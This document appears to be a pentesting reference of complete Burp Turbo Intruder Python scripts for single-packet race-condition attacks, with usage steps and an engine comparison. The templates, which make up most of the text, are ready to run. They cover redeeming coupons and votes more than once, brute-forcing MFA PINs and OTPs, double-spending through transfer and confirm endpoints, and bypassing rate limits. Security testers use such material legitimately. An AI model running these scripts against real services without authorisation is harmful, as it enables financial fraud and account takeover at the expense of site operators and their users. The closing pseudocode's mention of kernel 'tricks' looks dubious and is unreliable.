## Turbo Intruder Full Templates — Complete Python Code

Below are fully working Turbo Intruder `.py` templates for every major race-condition scenario.
Each is a self-contained Burp Turbo Intruder extension script — save as `.py`, load in Turbo Intruder,
and point at the target endpoint.

### Template 1: Basic Single-Packet Race (Coupon / Vote / Redeem)

```python
# turbo_basic_race.py
# Use against: coupon redemption, upvote/like, gift-card redeem, one-time actions
# Strategy: Send N identical requests in a single HTTP/2 packet. If the endpoint
# lacks atomic check-then-write, multiple succeed.
#
# Tune N: start at 20, increase to 50-100 if the server is fast (<10ms response).
# If using HTTP/1.1 only, remove engine=Engine.BURP2 line.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,           # Single TCP connection
        requestsPerConnection=100,         # H2 stream limit
        engine=Engine.BURP2,               # Single-packet engine (HTTP/2 only)
        pipeline=False,
    )
    # Queue N identical requests, all gated
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Release all final bytes in a single TCP write
    engine.openGate('race1')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    # Log all 200/201/202 responses — if count > expected_successes, race won
    if req.status in ('200', '201', '202', '204'):
        table.add(req)
```

### Template 2: Varying Payload per Request (PIN Brute Force / OTP Guess)

```python
# turbo_pin_bruteforce.py
# Use against: PIN-based MFA, OTP validation, numeric codes, short tokens
# Strategy: N concurrent guesses inside a single rate-limit window.
# Requires: known target account, known PIN length (e.g., 6 digits).
# Combine with Flatt first-sequence-sync for 10,000+ concurrent guesses.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=200,
        engine=Engine.BURP2,
    )
    # Generate all 4-digit PINs (0000-9999) — 10,000 candidates
    # This would be split across multiple runs. For single-packet,
    # test batches of ~50-100 at a time.
    for pin in range(10000):
        pin_str = f"{pin:04d}"
        # Build request body with the PIN
        body = target.req.replace(b'FUZZ', pin_str.encode())
        engine.queue(body, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=30)


def handleResponse(req, interesting):
    # A non-403/non-rate-limited response signals a hit
    if req.status != '403' and req.status != '429':
        table.add(req)
```

### Template 3: Multi-Endpoint Race (Deposit + Withdraw / Transfer + Confirm)

```python
# turbo_multi_endpoint.py
# Use against: wallet transfer (withdraw-to-A + deposit-to-B), 
#              balance-confirm race, double-spend across endpoints
# Strategy: Race two different endpoints that share state (common in fintech).
# Queue requests in alternating order so they arrive simultaneously.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2,
    )

    # Request 1: withdraw from account A (requires target A's endpoint base)
    # Request 2: deposit to account B
    # Alternate so the server processes both in the same scheduler tick
    transfer_req = b'POST /api/transfer HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"from\": \"acc_A\", \"to\": \"acc_B\", \"amount\": 1000, \"nonce\": \"RACE_NONCE\"}'

    confirm_req = b'POST /api/confirm-transfer HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"transfer_id\": \"RACE_NONCE\", \"confirm\": true}'

    # Queue interleaved
    for i in range(15):
        engine.queue(transfer_req.replace(b'RACE_NONCE', str(i).encode()), gate='race1')
        engine.queue(confirm_req.replace(b'RACE_NONCE', str(i).encode()), gate='race2')

    # Release both gates simultaneously
    engine.openGate('race1')
    engine.openGate('race2')
    engine.complete(timeout=15)


def handleResponse(req, interesting):
    table.add(req)
```

### Template 4: Rate-Limit Bypass via Racing

```python
# turbo_rate_limit_bypass.py
# Use against: endpoints with per-minute/per-second rate caps
# Strategy: N concurrent requests from the same session/IP all pass
# the rate-limit check before any increments the counter.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2,
    )

    # Queue enough requests to exhaust the rate-limit window + extras
    for i in range(100):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    # Compare responses — if first N succeed then rate-limit kicks in,
    # the race is partial. If ALL return 200, rate limiter is completely
    # bypassed by the concurrent batch.
    if req.status == '200':
        table.add(req)
    elif req.status == '429':
        interesting = True  # Mark the rate-limit boundary
        table.add(req)
```

### Template 5: Sequential Gate Race (Deferred Window / Multi-Step)

```python
# turbo_sequential_gates.py
# Use against: Deferred race windows (action creates a temporary state
# that must be raced before cleanup), multi-step flows
# Strategy: Gate 1 opens N actions. Gate 2 opens M consuming actions.
# Both fire in the same TCP write.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2,
    )

    # Gate 1: Create the resource
    create_req = b'POST /api/create-reservation HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"item_id\": \"LIMITED_ITEM\", \"qty\": 1}'

    # Gate 2: Claim the resource (must arrive before cleanup)
    claim_req = b'POST /api/claim-reservation HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"reservation_id\": \"RACE_ID\"}'

    for i in range(20):
        engine.queue(create_req, gate='race1')

    for i in range(20):
        engine.queue(claim_req, gate='race2')

    # Both gates release simultaneously
    engine.openGate('race1')
    engine.openGate('race2')
    engine.complete(timeout=15)


def handleResponse(req, interesting):
    table.add(req)
```

### Template 6: Race Window Measurement Probe

```python
# turbo_probe_window.py
# Use BEFORE the actual exploit to estimate the race window size.
# Measures response times for serial vs concurrent requests.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=10,
        engine=Engine.BURP2,
    )

    # Single request — baseline
    engine.queue(target.req, label='baseline')

    # 5 concurrent — test parallelism
    for i in range(5):
        engine.queue(target.req, label='race_test', gate='probe')

    engine.openGate('probe')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    table.add(req)
    # After run: compare req.time on 'baseline' vs 'race_test' labels.
    # If race_test times ≈ baseline, server parallelizes → good for race.
    # If race_test times = baseline × count, server serializes → harder race.
```

### Usage instructions:
1. Open Burp → Extensions → Turbo Intruder → send request to Turbo Intruder
2. Replace the default script with any template above
3. Adjust `N` (range upper bound) based on desired concurrency
4. Set `engine=Engine.BURP2` for HTTP/2; remove it for HTTP/1.1 fallback
5. Click "Attack" — observe results in table pane
6. For PIN brute-force: generate all candidates offline, split into batches of ~50-100
7. For Wireshark verification: `sudo tcpdump -i any -w race.pcap port 443` during attack run

### Engine comparison:
| Engine | Protocol | Race window | Use case |
|--------|----------|-------------|----------|
| `Engine.BURP2` | HTTP/2 | <1ms (single-packet) | Default — fastest, most reliable |
| `Engine.HTTP2` | HTTP/2 | ~5-10ms (no last-byte sync) | When BURP2 unavailable |
| `Engine.THREADED` | HTTP/1.1 | ~50-200ms | Fallback for non-H2 targets |
| `Engine.LEGACY` | HTTP/1.1 | ~100-500ms | Legacy/blocking backends |

### Combined Flatt first-sequence-sync approach (10,000+ requests):
For PIN brute-force (10,000 candidates in <200ms):
```python
# Pseudocode — full implementation per Flatt Security research:
# 1. Open N TCP connections (N = fragment count)
# 2. Synchronize TCP SEQ numbers across all connections
# 3. Queue M requests per connection (total = N × M = 10,000)
# 4. Release all final bytes across ALL connections simultaneously
#    using kernel-level TCP_COOKIE or IP_MTU_DISCOVER tricks
# 5. Server receives all 10,000 in the same IP-processing window
```
See: https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/

---

